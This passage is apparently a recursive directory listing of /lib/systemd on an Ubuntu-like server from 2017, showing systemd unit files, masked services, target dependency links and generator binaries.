-rw-r--r-- 1 root root  206 Dec  7  2017 lxd-bridge.service
-rw-r--r-- 1 root root  318 Dec  7  2017 lxd-containers.service
-rw-r--r-- 1 root root  197 Dec  7  2017 lxd.socket
-rw-r--r-- 1 root root  252 Nov 30  2017 snapd.autoimport.service
-rw-r--r-- 1 root root  386 Nov 30  2017 snapd.core-fixup.service
-rw-r--r-- 1 root root  290 Nov 30  2017 snapd.refresh.service
-rw-r--r-- 1 root root  323 Nov 30  2017 snapd.refresh.timer
-rw-r--r-- 1 root root  308 Nov 30  2017 snapd.service
-rw-r--r-- 1 root root  253 Nov 30  2017 snapd.snap-repair.service
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.socket
-rw-r--r-- 1 root root  474 Nov 30  2017 snapd.system-shutdown.service
-rw-r--r-- 1 root root  246 Nov 28  2017 apport-forward.socket
-rw-r--r-- 1 root root  311 Nov  8  2017 lxcfs.service
-rw-r--r-- 1 root root  670 Nov  8  2017 mdadm-shutdown.service
lrwxrwxrwx 1 root root   21 Oct 27  2017 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root   14 Oct 27  2017 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Oct 27  2017 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Oct 27  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Oct 27  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Oct 27  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Oct 27  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Oct 27  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Oct 27  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Oct 27  2017 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Oct 27  2017 fuse.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Oct 27  2017 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Oct 27  2017 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Oct 27  2017 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Oct 27  2017 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 reboot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Oct 27  2017 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Oct 27  2017 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Oct 27  2017 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Oct 27  2017 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Oct 27  2017 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Oct 27  2017 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  770 Oct 27  2017 console-getty.service
-rw-r--r-- 1 root root  742 Oct 27  2017 console-shell.service
-rw-r--r-- 1 root root  791 Oct 27  2017 container-getty@.service
-rw-r--r-- 1 root root 1010 Oct 27  2017 debug-shell.service
-rw-r--r-- 1 root root 1009 Oct 27  2017 emergency.service
-rw-r--r-- 1 root root 1.5K Oct 27  2017 getty@.service
-rw-r--r-- 1 root root  630 Oct 27  2017 initrd-cleanup.service
-rw-r--r-- 1 root root  790 Oct 27  2017 initrd-parse-etc.service
-rw-r--r-- 1 root root  640 Oct 27  2017 initrd-switch-root.service
-rw-r--r-- 1 root root  664 Oct 27  2017 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  677 Oct 27  2017 kmod-static-nodes.service
-rw-r--r-- 1 root root  473 Oct 27  2017 mail-transport-agent.target
-rw-r--r-- 1 root root  568 Oct 27  2017 quotaon.service
-rw-r--r-- 1 root root  612 Oct 27  2017 rc-local.service
-rw-r--r-- 1 root root  978 Oct 27  2017 rescue.service
-rw-r--r-- 1 root root 1.1K Oct 27  2017 serial-getty@.service
-rw-r--r-- 1 root root  653 Oct 27  2017 systemd-ask-password-console.service
-rw-r--r-- 1 root root  681 Oct 27  2017 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Oct 27  2017 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Oct 27  2017 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Oct 27  2017 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Oct 27  2017 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  497 Oct 27  2017 systemd-exit.service
-rw-r--r-- 1 root root  674 Oct 27  2017 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Oct 27  2017 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Oct 27  2017 systemd-fsckd.service
-rw-r--r-- 1 root root  544 Oct 27  2017 systemd-halt.service
-rw-r--r-- 1 root root  631 Oct 27  2017 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Oct 27  2017 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Oct 27  2017 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Oct 27  2017 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Oct 27  2017 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Oct 27  2017 systemd-initctl.service
-rw-r--r-- 1 root root  731 Oct 27  2017 systemd-journal-flush.service
-rw-r--r-- 1 root root 1.3K Oct 27  2017 systemd-journald.service
-rw-r--r-- 1 root root  557 Oct 27  2017 systemd-kexec.service
-rw-r--r-- 1 root root  691 Oct 27  2017 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Oct 27  2017 systemd-logind.service
-rw-r--r-- 1 root root  693 Oct 27  2017 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Oct 27  2017 systemd-modules-load.service
-rw-r--r-- 1 root root  685 Oct 27  2017 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 1.3K Oct 27  2017 systemd-networkd.service
-rw-r--r-- 1 root root  553 Oct 27  2017 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Oct 27  2017 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Oct 27  2017 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Oct 27  2017 systemd-reboot.service
-rw-r--r-- 1 root root  757 Oct 27  2017 systemd-remount-fs.service
-rw-r--r-- 1 root root  907 Oct 27  2017 systemd-resolved.service
-rw-r--r-- 1 root root  696 Oct 27  2017 systemd-rfkill.service
-rw-r--r-- 1 root root  497 Oct 27  2017 systemd-suspend.service
-rw-r--r-- 1 root root  649 Oct 27  2017 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Oct 27  2017 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Oct 27  2017 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Oct 27  2017 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  703 Oct 27  2017 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Oct 27  2017 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  823 Oct 27  2017 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Oct 27  2017 systemd-udev-trigger.service
-rw-r--r-- 1 root root  825 Oct 27  2017 systemd-udevd.service
-rw-r--r-- 1 root root  757 Oct 27  2017 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Oct 27  2017 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Oct 27  2017 systemd-user-sessions.service
-rw-r--r-- 1 root root  528 Oct 27  2017 user@.service
-rw-r--r-- 1 root root  403 Oct 27  2017 -.slice
-rw-r--r-- 1 root root  879 Oct 27  2017 basic.target
-rw-r--r-- 1 root root  379 Oct 27  2017 bluetooth.target
-rw-r--r-- 1 root root  358 Oct 27  2017 busnames.target
-rw-r--r-- 1 root root  394 Oct 27  2017 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Oct 27  2017 cryptsetup.target
-rw-r--r-- 1 root root  670 Oct 27  2017 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Oct 27  2017 dev-mqueue.mount
-rw-r--r-- 1 root root  431 Oct 27  2017 emergency.target
-rw-r--r-- 1 root root  501 Oct 27  2017 exit.target
-rw-r--r-- 1 root root  440 Oct 27  2017 final.target
-rw-r--r-- 1 root root  460 Oct 27  2017 getty.target
-rw-r--r-- 1 root root  558 Oct 27  2017 graphical.target
-rw-r--r-- 1 root root  487 Oct 27  2017 halt.target
-rw-r--r-- 1 root root  447 Oct 27  2017 hibernate.target
-rw-r--r-- 1 root root  468 Oct 27  2017 hybrid-sleep.target
-rw-r--r-- 1 root root  553 Oct 27  2017 initrd-fs.target
-rw-r--r-- 1 root root  526 Oct 27  2017 initrd-root-fs.target
-rw-r--r-- 1 root root  691 Oct 27  2017 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Oct 27  2017 initrd.target
-rw-r--r-- 1 root root  501 Oct 27  2017 kexec.target
-rw-r--r-- 1 root root  395 Oct 27  2017 local-fs-pre.target
-rw-r--r-- 1 root root  507 Oct 27  2017 local-fs.target
-rw-r--r-- 1 root root  405 Oct 27  2017 machine.slice
-rw-r--r-- 1 root root  492 Oct 27  2017 multi-user.target
-rw-r--r-- 1 root root  464 Oct 27  2017 network-online.target
-rw-r--r-- 1 root root  461 Oct 27  2017 network-pre.target
-rw-r--r-- 1 root root  480 Oct 27  2017 network.target
-rw-r--r-- 1 root root  514 Oct 27  2017 nss-lookup.target
-rw-r--r-- 1 root root  473 Oct 27  2017 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Oct 27  2017 paths.target
-rw-r--r-- 1 root root  552 Oct 27  2017 poweroff.target
-rw-r--r-- 1 root root  377 Oct 27  2017 printer.target
-rw-r--r-- 1 root root  693 Oct 27  2017 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Oct 27  2017 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  543 Oct 27  2017 reboot.target
-rw-r--r-- 1 root root  396 Oct 27  2017 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Oct 27  2017 remote-fs.target
-rw-r--r-- 1 root root  486 Oct 27  2017 rescue.target
-rw-r--r-- 1 root root  500 Oct 27  2017 rpcbind.target
-rw-r--r-- 1 root root  402 Oct 27  2017 shutdown.target
-rw-r--r-- 1 root root  362 Oct 27  2017 sigpwr.target
-rw-r--r-- 1 root root  420 Oct 27  2017 sleep.target
-rw-r--r-- 1 root root  409 Oct 27  2017 slices.target
-rw-r--r-- 1 root root  380 Oct 27  2017 smartcard.target
-rw-r--r-- 1 root root  356 Oct 27  2017 sockets.target
-rw-r--r-- 1 root root  380 Oct 27  2017 sound.target
-rw-r--r-- 1 root root  441 Oct 27  2017 suspend.target
-rw-r--r-- 1 root root  353 Oct 27  2017 swap.target
-rw-r--r-- 1 root root  715 Oct 27  2017 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  719 Oct 27  2017 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Oct 27  2017 sys-kernel-debug.mount
-rw-r--r-- 1 root root  518 Oct 27  2017 sysinit.target
-rw-r--r-- 1 root root 1.3K Oct 27  2017 syslog.socket
-rw-r--r-- 1 root root  585 Oct 27  2017 system-update.target
-rw-r--r-- 1 root root  436 Oct 27  2017 system.slice
-rw-r--r-- 1 root root  646 Oct 27  2017 systemd-ask-password-console.path
-rw-r--r-- 1 root root  574 Oct 27  2017 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  409 Oct 27  2017 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  540 Oct 27  2017 systemd-fsckd.socket
-rw-r--r-- 1 root root  524 Oct 27  2017 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Oct 27  2017 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Oct 27  2017 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  842 Oct 27  2017 systemd-journald.socket
-rw-r--r-- 1 root root  591 Oct 27  2017 systemd-networkd.socket
-rw-r--r-- 1 root root  617 Oct 27  2017 systemd-rfkill.socket
-rw-r--r-- 1 root root  450 Oct 27  2017 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  578 Oct 27  2017 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Oct 27  2017 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  395 Oct 27  2017 time-sync.target
-rw-r--r-- 1 root root  405 Oct 27  2017 timers.target
-rw-r--r-- 1 root root  417 Oct 27  2017 umount.target
-rw-r--r-- 1 root root  392 Oct 27  2017 user.slice
-rw-r--r-- 1 root root  342 Oct 27  2017 getty-static.service
-rw-r--r-- 1 root root  153 Oct 27  2017 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  175 Oct 27  2017 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  715 Oct 27  2017 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  420 Oct 23  2017 resolvconf.service
drwxr-xr-x 2 root root 4.0K Sep 22  2017 halt.target.wants
drwxr-xr-x 2 root root 4.0K Sep 22  2017 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Sep 22  2017 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Sep 22  2017 busnames.target.wants
lrwxrwxrwx 1 root root    9 Sep 22  2017 screen-cleanup.service -> /dev/null
lrwxrwxrwx 1 root root   27 Sep 13  2017 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 Sep 13  2017 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 Sep 13  2017 plymouth-halt.service
-rw-r--r-- 1 root root  426 Sep 13  2017 plymouth-kexec.service
-rw-r--r-- 1 root root  421 Sep 13  2017 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 Sep 13  2017 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 Sep 13  2017 plymouth-quit.service
-rw-r--r-- 1 root root  244 Sep 13  2017 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Sep 13  2017 plymouth-reboot.service
-rw-r--r-- 1 root root  532 Sep 13  2017 plymouth-start.service
-rw-r--r-- 1 root root  291 Sep 13  2017 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Sep 13  2017 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Sep 13  2017 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  155 Sep  5  2017 phpsessionclean.service
-rw-r--r-- 1 root root  144 Sep  5  2017 phpsessionclean.timer
-rw-r--r-- 1 root root  202 Jun 19  2017 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Jun 19  2017 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  169 Jun 19  2017 apt-daily.service
-rw-r--r-- 1 root root  212 Jun 19  2017 apt-daily.timer
-rw-r--r-- 1 root root  189 Jun 14  2017 uuidd.service
-rw-r--r-- 1 root root  126 Jun 14  2017 uuidd.socket
-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service
-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service
-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket
-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service
-rw-r--r-- 1 root root  411 Feb  3  2017 mysql.service
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  251 Sep 18  2016 open-vm-tools.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
lrwxrwxrwx 1 root root    9 Apr 16  2016 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  334 Apr 16  2016 dm-event.service
-rw-r--r-- 1 root root  248 Apr 16  2016 dm-event.socket
-rw-r--r-- 1 root root  380 Apr 16  2016 lvm2-lvmetad.service
-rw-r--r-- 1 root root  215 Apr 16  2016 lvm2-lvmetad.socket
-rw-r--r-- 1 root root  335 Apr 16  2016 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  213 Apr 16  2016 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  658 Apr 16  2016 lvm2-monitor.service
-rw-r--r-- 1 root root  382 Apr 16  2016 lvm2-pvscan@.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  234 Apr  8  2016 acpid.service
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service
-rw-r--r-- 1 root root  455 Mar 29  2016 iscsid.service
-rw-r--r-- 1 root root 1.1K Mar 29  2016 open-iscsi.service
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.socket
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path
-rw-r--r-- 1 root root  169 Jan 14  2016 atd.service
-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Oct 27  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Oct 27  2017 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Oct 27  2017 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 20 Oct 27  2017 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Oct 27  2017 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Oct 27  2017 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Oct 27  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Oct 27  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Oct 27  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Oct 27  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Oct 27  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Oct 27  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Oct 27  2017 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Oct 27  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Oct 27  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Oct 27  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Sep 13  2017 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 24 Feb  1  2017 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 25 Feb  1  2017 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 19 Feb  1  2017 setvtrgb.service -> ../setvtrgb.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Oct 27  2017 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Oct 27  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Oct 27  2017 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Oct 27  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 29 Sep 13  2017 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 Sep 13  2017 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 Sep 13  2017 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Oct 27  2017 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Oct 27  2017 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Oct 26  2017 debian.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Oct 26  2017 disable-with-time-daemon.conf

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 200 Oct 27  2017 resolvconf.conf

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Apr 12  2016 apache2-systemd.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Sep 13  2017 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-shutdown:
total 4.0K
-rwxr-xr-x 1 root root 160 Nov  8  2017 mdadm.shutdown

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Oct 27  2017 80-container-host0.network
-rw-r--r-- 1 root root 482 Oct 27  2017 80-container-ve.network
-rw-r--r-- 1 root root  80 Oct 27  2017 99-default.link

/lib/systemd/system-generators:
total 680K
-rwxr-xr-x 1 root root  71K Oct 27  2017 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  59K Oct 27  2017 systemd-dbus1-generator
-rwxr-xr-x 1 root root  43K Oct 27  2017 systemd-debug-generator
-rwxr-xr-x 1 root root  79K Oct 27  2017 systemd-fstab-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-getty-generator
-rwxr-xr-x 1 root root 119K Oct 27  2017 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-insserv-generator
-rwxr-xr-x 1 root root  35K Oct 27  2017 systemd-rc-local-generator
